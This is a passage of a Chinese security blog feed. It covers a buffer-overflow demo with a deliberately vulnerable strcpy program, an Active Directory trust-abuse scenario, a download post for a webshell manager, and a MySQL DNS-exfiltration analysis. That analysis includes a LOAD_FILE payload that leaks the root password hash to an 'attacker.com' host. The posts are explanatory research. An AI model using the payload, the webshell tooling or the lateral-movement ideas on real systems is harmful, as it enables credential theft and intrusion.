$0x0,-0x4(%rbp)</div><div class="line">   0x0000000100000f1d &lt;+29&gt;:	mov    %edi,-0x8(%rbp)</div><div class="line">   0x0000000100000f20 &lt;+32&gt;:	mov    %rsi,-0x10(%rbp)</div><div class="line">   0x0000000100000f24 &lt;+36&gt;:	mov    %rcx,-0x18(%rbp)</div><div class="line">   0x0000000100000f28 &lt;+40&gt;:	mov    %rax,-0x20(%rbp)</div><div class="line">   0x0000000100000f2c &lt;+44&gt;:	cmpl   $0x2,-0x8(%rbp)</div><div class="line">   0x0000000100000f30 &lt;+48&gt;:	jl     0x100000f43 &lt;main+67&gt;</div><div class="line">   0x0000000100000f36 &lt;+54&gt;:	mov    -0x10(%rbp),%rax</div><div class="line">   0x0000000100000f3a &lt;+58&gt;:	mov    0x8(%rax),%rdi</div><div class="line">   0x0000000100000f3e &lt;+62&gt;:	callq  0x100000ea0 &lt;func&gt;</div><div class="line">   0x0000000100000f43 &lt;+67&gt;:	lea    0x5b(%rip),%rdi        # 0x100000fa5</div><div class="line">   0x0000000100000f4a &lt;+74&gt;:	mov    -0x18(%rbp),%rsi</div><div class="line">   0x0000000100000f4e &lt;+78&gt;:	mov    -0x20(%rbp),%rdx</div><div class="line">   0x0000000100000f52 &lt;+82&gt;:	mov    $0x0,%al</div><div class="line">   0x0000000100000f54 &lt;+84&gt;:	callq  0x100000f68</div><div class="line">   0x0000000100000f59 &lt;+89&gt;:	mov    -0x4(%rbp),%ecx</div><div class="line">   0x0000000100000f5c &lt;+92&gt;:	mov    %eax,-0x24(%rbp)</div><div class="line">   0x0000000100000f5f &lt;+95&gt;:	mov    %ecx,%eax</div><div class="line">   0x0000000100000f61 &lt;+97&gt;:	add    $0x30,%rsp</div><div class="line">   0x0000000100000f65 &lt;+101&gt;:	pop    %rbp</div><div class="line">   0x0000000100000f66 &lt;+102&gt;:	retq</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
<p>注意到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x0000000100000f1d &lt;+29&gt;:    mov    %edi,-0x8(%rbp)</div><div class="line">0x0000000100000f20 &lt;+32&gt;:    mov    %rsi,-0x10(%rbp)</div><div class="line">0x0000000100000f24 &lt;+36&gt;:    mov    %rcx,-0x18(%rbp)</div><div class="line">0x0000000100000f28 &lt;+40&gt;:    mov    %rax,-0x20(%rbp)</div></pre></td></tr></table></figure>
<p>使用了<code>%edi,%rsi,%rcx,%rax</code>，查阅手册</p>
<p><img src="/old/2017/12/05/寄存器及其相关/1512489308066.jpg" alt="register.png"></p>
<h3 id="Simple-Demo2"><a href="#Simple-Demo2" class="headerlink" title="Simple Demo2"></a>Simple Demo2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果在MacOS系统想要进行Buffer Overflow的测试的话，如果使用GCC编译需要用这两个<code>-fno-stack-protector -D_FORTIFY_SOURCE=0</code>选项。</p>
<blockquote>
<p>GCC堆栈保护</p>
<blockquote>
<p>-fstack-protector：</p>
<blockquote>
<p>启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码。</p>
</blockquote>
<p>-fstack-protector-all：</p>
<blockquote>
<p>启用堆栈保护，为所有函数插入保护代码。</p>
</blockquote>
<p>-fno-stack-protector：</p>
<blockquote>
<p>禁用堆栈保护。</p>
</blockquote>
</blockquote>
</blockquote>
<p>stack-protector保护方式修改函数栈的组织，在缓冲区和可控数据buffer间插入一个canary word(标志)。当缓冲区被溢出时，canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出。</p>
<p>汇编代码中<code>mov %edi,-0x8(%rbp)</code>这样的为AT&amp;T的语法。<br>Intel 语法的间接内存引用的格式为:<br>section:[base+index*scale+displacement]<br>而在 AT&amp;T 语法中对应的形式为:<br>section:displacement(base,index,scale)</p>
<p><code>mov %edi,-0x8(%rbp)</code> =<code>(%rbp + 0*0 - 0x8)</code></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 二进制 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[活动目录以及域安全]]></title>
      <url>/2017/10/10/%E5%9F%9F%E5%AE%89%E5%85%A8/</url>
      <content type="html"><![CDATA[<p>知己知彼，百战不殆-孙子</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一直以来在网上域渗透的资料，几乎专注的都是一些命令，以及一些工具的使用，但是缺乏对活动目录以及与域本身的安全的研究思考。</p>
<a id="more"></a>
<h3 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h3><p>当我们进入了内网，可能我们仅仅想要获取某台机器上的资料，如果能获取那台机器所在域的域控权限固然是最好不过的事情，但有时候并不能得偿所愿。</p>
<p>当我们必须了解了活动目录的运转机制以及安全机制的情况下，才能更好的进行渗透的工作。</p>
<h1 id="域"><a href="#域" class="headerlink" title="域"></a>域</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="名词"><a href="#名词" class="headerlink" title="名词:"></a>名词:</h3><p>域控（Domain Controller），DC</p>
<p>活动目录目录服务（Active Directory Directory Services），ADDS</p>
<p>组织单位（Organizational Unit ）</p>
<p>域（Domain）</p>
<p>域树（Tree）</p>
<p>域林（Forest）</p>
<h3 id="1-什么是活动目录？"><a href="#1-什么是活动目录？" class="headerlink" title="1.什么是活动目录？"></a>1.什么是活动目录？</h3><p>活动目录是Windows Server在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。</p>
<p><img src="/old/2017/10/10/域安全/2229391424.png" alt="DA67951C-17D7-45D1-907B-504CBE265682.png"></p>
<p>图【1】：</p>
<h3 id="2-什么是活动目录目录服务？"><a href="#2-什么是活动目录目录服务？" class="headerlink" title="2.什么是活动目录目录服务？"></a>2.什么是活动目录目录服务？</h3><p>“The Active Directory directory service is a distributed database that stores and manages information about network resources, as well as application-specific data from directory-enabled applications. Active Directory allows administrators to organize objects of a network (such as users, computers, and devices) into a hierarchical collection of containers known as the logical structure. The top-level logical container in this hierarchy is the forest. Within a forest are domain containers, and within domains are organizational units.”</p>
<p>首先大家都知道目录，目录提供了文档内容的概览，可以使我们迅速找到一本书，字典中特定的章节。那么将这个概念应用于网络管理员管理服务器中。假设一个公司中有一千台服务器，管理员想要找到特定的服务器的话,一台一台的登陆，显然是极其低效率的方法。所以目录的理念同样适用在解决这种情况。</p>
<p>ADDS提供给域管理一个集中管理的机制和架构。假设一个公司中有一千台服务器，管理员想要找到特定的服务器的话,一台一台的登陆，显然是极其低效率的方法。ADDS可以让域管理员对网络中的所有资源进行访问（登陆，读写等操作）我们可以将其理解为单点登录。</p>
<p>活动目录目录服务提供的功能</p>
<p>（1）提供单点登录访问服务器、服务器上指定的资源与应用程序。<br>（2）多播复制（Replicatiion）／／暂时不关心<br>（3）基于属性搜索 eg:基于文件名搜索<br>（4）基于分类搜索 eg:基于分类搜索</p>
<h3 id="3-什么是域？"><a href="#3-什么是域？" class="headerlink" title="3.什么是域？"></a>3.什么是域？</h3><p>域是Windows Server 2008的核心单位</p>
<p>我们来梳理一下 活动目录和域的关系：</p>
<p>1.域是逻辑上的服务器以及PC的逻辑分组，在一个域里面的用户都使用公共的安全机制和账户信息。</p>
<p>2.活动目录将域中的资源组织在一起，存放这些资源的各种信息。</p>
<h3 id="4-什么是树（域树）？"><a href="#4-什么是树（域树）？" class="headerlink" title="4.什么是树（域树）？"></a>4.什么是树（域树）？</h3><p>“A domain tree is made up of several domains that share a common schema and configuration, forming a contiguous namespace. Domains in a tree are also linked together by trust relationships. Active Directory is a set of one or more trees.”</p>
<p>根据上一条活动目录的作用，很容易理解树，活动目录拥有所有的域中机器账户以及配置。域树由多个域组成，这些域同时由根域DC管理，共享同一表结构和配置，形成一个连续的命名空间。</p>
<p>举个例子，就像如果以it.Johnis.online为例，Johnis.online就是根域，it就是子域。因为是“父-子”关系，Johnis.online</p>
<p>拥有it这个域的所有权限。</p>
<h3 id="5-信任关系"><a href="#5-信任关系" class="headerlink" title="5.信任关系"></a>5.信任关系</h3><p>“A trust is a relationship, which you establish between domains, that makes it possible for users in one domain to be authenticated by a domain controller in the other domain.”</p>
<p>信任关系这个字面意思很好理解，我就不多做解释了。</p>
<p>关于域的信任关系，暂时我们只关心信任关系的方向问题。</p>
<p>信任分为<strong>双向信任</strong>以及<strong>单向信任</strong>，两种信任关系字面上也很好理解。</p>
<p>我们要重点关心的是活动目录中域树的默认信任关系，默认任何新加入域树中的域它的信任关系都是双向并且可传递的。</p>
<p>##情景模拟</p>
<p>举个例子：</p>
<p>当我们的根域（Johnis.online）中有</p>
<ul>
<li>子域 it</li>
<li>子域 workgroup</li>
</ul>
<p>由域林中默认的信任关系可知，it域与根域Johnis.online相互信任，workgroup域与根域Johnis.online相互信任。</p>
<p><img src="/old/2017/10/10/域安全/3795199765.png" alt="8F8F7558-B362-405C-AA8A-7DEBD2D16020.png"></p>
<p>所以通过信任关系的可传递性，it域默认信任workgroup域。</p>
<p>那么我们考虑这么一种情况，IT域本身的各种对外服务（例如：web）默认它为非常安全，我们并没有办法拿下它的权限。</p>
<p>it域的管理员为了方便，在他管理的it域中，将其中一台（10.11.47.70）开启web服务的wwwroot文件目录权限设置为了</p>
<p>everyone，在其it域的用户都可以看见这个文件目录。这个做法讲道理是没有问题的，因为我们假设it域本身很安全，它对dmz内的机器以及账户共享这些资料。</p>
<p><img src="/old/2017/10/10/域安全/3867516861.png" alt="8B490D0D-85B4-40F2-A7DE-9E9E8C9D2BDD.png"></p>
<p>假设我们拿下了workgroup域中的一台服务器（192.168.2.3）的一个普通用户的账号commonuser，而且并没有拿到workgroup域控（DC）。</p>
<p>其实我们是可以通过这个普通权限的workgroup的域普通账号commonuser去访问it域中10.11.47.70这台的wwwroot的文件（默认只有读取权限），从而可以做代码审计之类的工作去突破it域的防护。</p>
<p><img src="/old/2017/10/10/域安全/2910418980.png" alt="81D0833C-3CBB-4793-B71B-B868E2D1D99E.png"></p>
<p>“by the way：为什么我觉得管理员会用everyone呢？因为你们可以观察前一副图，微软把everyone默认设为第一个选项，直接选的确很方便”</p>
<p>Reference：<br>《Windwos Server 2008安全技术详解》<br>微软技术参考网站：<a href="https://support.microsoft.com" target="_blank" rel="external">https://support.microsoft.com</a></p>
]]></content>
      
        <categories>
            
            <category> 安全研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 域安全 </tag>
            
            <tag> 域控 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Raindrop内测版]]></title>
      <url>/2017/10/10/raindrop/</url>
      <content type="html"><![CDATA[<h1 id="Raindrop"><a href="#Raindrop" class="headerlink" title="Raindrop"></a>Raindrop</h1><h2 id="1-Raindrop是什么"><a href="#1-Raindrop是什么" class="headerlink" title="1.Raindrop是什么?"></a>1.Raindrop是什么?</h2><p>Raindrop是一款将来可以跨平台的网站管理工具</p>
<h2 id="2-为什么要开发？"><a href="#2-为什么要开发？" class="headerlink" title="2.为什么要开发？"></a>2.为什么要开发？</h2><p>首先一直觉得MacOS下没有像中国菜刀那样非常好用的服务器管理工具。<br>想要进行服务器管理，经常需要开虚拟机来使用菜刀，感觉非常不方便。</p>
<p>其次，在用过其他人开发的类似软件，例如*斧/*剑。感觉其功能性并未达到自己的需求，所以干脆自己写一个来用吧！</p>
<a id="more"></a>
<h2 id="3-用了什么开发？"><a href="#3-用了什么开发？" class="headerlink" title="3.用了什么开发？"></a>3.用了什么开发？</h2><p>为了将来进行跨平台的使用，我选择了采用C++框架Qt来进行开发。<br>但是由于现在开发者（本人）精力有限，目前精力主要集中在MacOS平台版本的开发上。</p>
<h2 id="4-开发进度"><a href="#4-开发进度" class="headerlink" title="4.开发进度"></a>4.开发进度</h2><h3 id="已完成列表"><a href="#已完成列表" class="headerlink" title="已完成列表"></a>已完成列表</h3><p><em>支持类型</em></p>
<p>PHP (POST/GET)[eval]</p>
<p><em>功能</em></p>
<p>读取服务器的信息</p>
<p>服务器文件管理</p>
<p>服务器进程管理</p>
<h3 id="TODO-LIST"><a href="#TODO-LIST" class="headerlink" title="TODO-LIST"></a>TODO-LIST</h3><p>支持aspx,asp,jsp,py,ruby</p>
<p>虚拟终端</p>
<p>数据库管理</p>
<p>一键代理流量</p>
<p>一键产生交互shell</p>
<h2 id="5-是否开源？"><a href="#5-是否开源？" class="headerlink" title="5.是否开源？"></a>5.是否开源？</h2><p>目前内测暂不进行开源，当第一正式版本后，如果大家觉得不错，有朋友有兴趣一起开发，将开源。否则就自己开发自己用了:)</p>
<h3 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h3><p><img src="/old/2017/10/10/raindrop/3787057814.png" alt="2BFEF3A6-FA8C-4CF7-8F63-447D41A155C9.png"><br><img src="/old/2017/10/10/raindrop/299842097.png" alt="80DE70E8-22F6-41AD-9457-A94CE722CAD3.png"><br><img src="/old/2017/10/10/raindrop/4173791864.png" alt="1DD18ACF-0FA1-4878-A0DE-126A7AA5A7E2.png"><br><img src="/old/2017/10/10/raindrop/1884250126.png" alt="845CDB3D-2A7E-400F-A1E8-6A4D8AC156A5.png"><br><img src="/old/2017/10/10/raindrop/2965915805.png" alt="CDF92DF1-AF28-4FF8-B7D4-A88404EA315D.png"><br><img src="/old/2017/10/10/raindrop/1999195523.png" alt="2E5C97BF-B835-491E-A5B3-E0C4BCAF3E89.png"></p>
<p>###下载链接</p>
<p>链接: <a href="https://pan.baidu.com/s/1miSKCRm" target="_blank" rel="external">https://pan.baidu.com/s/1miSKCRm</a> 密码: 443y</p>
<p>###其他<br>任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Webshell管理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows/*nix下DNS传出注入数据的背后]]></title>
      <url>/2017/10/10/Windows-DNS/</url>
      <content type="html"><![CDATA[<p>几天前和朋友在测试一个注入，想要使用MySQL通过load_file()函数，再由DNS查询传出注入出来的数据时候遇到的问题</p>
<p>以下语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span> <span class="keyword">LIMIT</span> <span class="number">1</span>),<span class="string">'.attacker.com\\foobar'</span>));</div></pre></td></tr></table></figure></p>
<p>只有Windows + MySQL才能成功通过DNS查询包传出我们想要的数据</p>
<p>而在*nix + MySQL环境下是无法成功的。</p>
<p>（大家可以试试）</p>
<p>这是为什么呢，我探究了一下背后的原理</p>
<a id="more"></a>
<p>MySQL load_file()函数相关的源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ((file= mysql_file_open(key_file_loadfile,</div><div class="line">file_name-&gt;ptr(), O_RDONLY, MYF(<span class="number">0</span>))) &lt; <span class="number">0</span>)</div><div class="line"><span class="keyword">goto</span> err;</div></pre></td></tr></table></figure></p>
<p>看一下mysql_file_open()这个函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">inline</span> File</div><div class="line">inline_mysql_file_open(</div><div class="line">#ifdef HAVE_PSI_FILE_INTERFACE</div><div class="line">PSI_file_key key, <span class="keyword">const</span> <span class="keyword">char</span> *src_file, uint src_line,</div><div class="line">#endif</div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> flags, myf myFlags)</div><div class="line">&#123;</div><div class="line">File file;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_PSI_FILE_INTERFACE</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PSI_file_locker</span> *<span class="title">locker</span>;</span></div><div class="line">PSI_file_locker_state state;</div><div class="line">locker= PSI_FILE_CALL(get_thread_file_name_locker)</div><div class="line">(&amp;state, key, PSI_FILE_OPEN, filename, &amp;locker);</div><div class="line"><span class="keyword">if</span> (likely(locker != <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">PSI_FILE_CALL(start_file_open_wait)(locker, src_file, src_line);</div><div class="line">file= my_open(filename, flags, myFlags);</div><div class="line">PSI_FILE_CALL(end_file_open_wait_and_bind_to_descriptor)(locker, file);</div><div class="line"><span class="keyword">return</span> file;</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">file= my_open(filename, flags, myFlags);</div><div class="line"><span class="keyword">return</span> file;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以看到my_open()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function">File <span class="title">my_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *FileName, <span class="keyword">int</span> Flags, myf MyFlags)</span></span></div><div class="line"><span class="function"><span class="comment">/* Path-name of file */</span></span></div><div class="line"><span class="function"><span class="comment">/* Read | write .. */</span></span></div><div class="line"><span class="function"><span class="comment">/* Special flags */</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">File fd;</div><div class="line">DBUG_ENTER(<span class="string">"my_open"</span>);</div><div class="line">DBUG_PRINT(<span class="string">"my"</span>,(<span class="string">"Name: '%s'  Flags: %d  MyFlags: %d"</span>,</div><div class="line">FileName, Flags, MyFlags));</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_WIN32)</span></div><div class="line">fd= my_win_open(FileName, Flags);</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">fd = open(FileName, Flags, my_umask);        <span class="comment">/* Normal unix */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">fd= my_register_filename(fd, FileName, FILE_BY_OPEN, EE_FILENOTFOUND, MyFlags);</div><div class="line">DBUG_RETURN(fd);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最终可以看到在不同的环境有两种打开my_win_open(),open()</p>
<p>继续追踪my_win_open()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div></pre></td><td class="code"><pre><div class="line"><span class="function">File <span class="title">my_win_sopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">int</span> oflag, <span class="keyword">int</span> shflag, <span class="keyword">int</span> pmode)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span>  fh;                                <span class="comment">/* handle of opened file */</span></div><div class="line"><span class="keyword">int</span> mask;</div><div class="line">HANDLE osfh;                            <span class="comment">/* OS handle of opened file */</span></div><div class="line">DWORD fileaccess;                       <span class="comment">/* OS file access (requested) */</span></div><div class="line">DWORD fileshare;                        <span class="comment">/* OS file sharing mode */</span></div><div class="line">DWORD filecreate;                       <span class="comment">/* OS method of opening/creating */</span></div><div class="line">DWORD fileattrib;                       <span class="comment">/* OS file attribute flags */</span></div><div class="line">SECURITY_ATTRIBUTES SecurityAttributes;</div><div class="line"></div><div class="line">DBUG_ENTER(<span class="string">"my_win_sopen"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (check_if_legal_filename(path))</div><div class="line">&#123;</div><div class="line">errno= EACCES;</div><div class="line">DBUG_RETURN(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line">SecurityAttributes.nLength= <span class="keyword">sizeof</span>(SecurityAttributes);</div><div class="line">SecurityAttributes.lpSecurityDescriptor= <span class="literal">NULL</span>;</div><div class="line">SecurityAttributes.bInheritHandle= !(oflag &amp; _O_NOINHERIT);</div><div class="line"></div><div class="line"><span class="comment">/* decode the access flags  */</span></div><div class="line"><span class="keyword">switch</span> (oflag &amp; (_O_RDONLY | _O_WRONLY | _O_RDWR)) &#123;</div><div class="line"><span class="keyword">case</span> _O_RDONLY:         <span class="comment">/* read access */</span></div><div class="line">fileaccess= GENERIC_READ;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _O_WRONLY:         <span class="comment">/* write access */</span></div><div class="line">fileaccess= GENERIC_WRITE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _O_RDWR:           <span class="comment">/* read and write access */</span></div><div class="line">fileaccess= GENERIC_READ | GENERIC_WRITE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">default</span>:                <span class="comment">/* error, bad oflag */</span></div><div class="line">errno= EINVAL;</div><div class="line">DBUG_RETURN(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* decode sharing flags */</span></div><div class="line"><span class="keyword">switch</span> (shflag) &#123;</div><div class="line"><span class="keyword">case</span> _SH_DENYRW:        <span class="comment">/* exclusive access except delete */</span></div><div class="line">fileshare= FILE_SHARE_DELETE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYWR:        <span class="comment">/* share read and delete access */</span></div><div class="line">fileshare= FILE_SHARE_READ | FILE_SHARE_DELETE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYRD:        <span class="comment">/* share write and delete access */</span></div><div class="line">fileshare= FILE_SHARE_WRITE | FILE_SHARE_DELETE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYNO:        <span class="comment">/* share read, write and delete access */</span></div><div class="line">fileshare= FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYRWD:       <span class="comment">/* exclusive access */</span></div><div class="line">fileshare= <span class="number">0L</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYWRD:       <span class="comment">/* share read access */</span></div><div class="line">fileshare= FILE_SHARE_READ;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYRDD:       <span class="comment">/* share write access */</span></div><div class="line">fileshare= FILE_SHARE_WRITE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYDEL:       <span class="comment">/* share read and write access */</span></div><div class="line">fileshare= FILE_SHARE_READ | FILE_SHARE_WRITE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">default</span>:                <span class="comment">/* error, bad shflag */</span></div><div class="line">errno= EINVAL;</div><div class="line">DBUG_RETURN(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* decode open/create method flags  */</span></div><div class="line"><span class="keyword">switch</span> (oflag &amp; (_O_CREAT | _O_EXCL | _O_TRUNC)) &#123;</div><div class="line"><span class="keyword">case</span> <span class="number">0</span>:</div><div class="line"><span class="keyword">case</span> _O_EXCL:                   <span class="comment">/* ignore EXCL w/o CREAT */</span></div><div class="line">filecreate= OPEN_EXISTING;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> _O_CREAT:</div><div class="line">filecreate= OPEN_ALWAYS;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> _O_CREAT | _O_EXCL:</div><div class="line"><span class="keyword">case</span> _O_CREAT | _O_TRUNC | _O_EXCL:</div><div class="line">filecreate= CREATE_NEW;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> _O_TRUNC:</div><div class="line"><span class="keyword">case</span> _O_TRUNC | _O_EXCL:        <span class="comment">/* ignore EXCL w/o CREAT */</span></div><div class="line">filecreate= TRUNCATE_EXISTING;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> _O_CREAT | _O_TRUNC:</div><div class="line">filecreate= CREATE_ALWAYS;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">default</span>:</div><div class="line"><span class="comment">/* this can't happen ... all cases are covered */</span></div><div class="line">errno= EINVAL;</div><div class="line">DBUG_RETURN(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* decode file attribute flags if _O_CREAT was specified */</span></div><div class="line">fileattrib= FILE_ATTRIBUTE_NORMAL;     <span class="comment">/* default */</span></div><div class="line"><span class="keyword">if</span> (oflag &amp; _O_CREAT)</div><div class="line">&#123;</div><div class="line">_umask((mask= _umask(<span class="number">0</span>)));</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!((pmode &amp; ~mask) &amp; _S_IWRITE))</div><div class="line">fileattrib= FILE_ATTRIBUTE_READONLY;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* Set temporary file (delete-on-close) 